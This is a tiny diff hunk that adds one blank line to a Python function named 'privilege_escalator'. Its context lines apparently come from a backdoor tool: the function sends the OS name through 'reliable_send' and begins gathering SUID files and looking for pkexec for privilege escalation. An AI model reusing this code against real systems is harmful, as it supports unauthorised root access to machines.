@@ -206,6 +206,7 @@ def privilege_escalator(command):
     read_stream_result =""
     reliable_send(os.name)
     print(os.name)
+    
     if os.name == 'posix':
         findpkexec = False
         suid_files = []
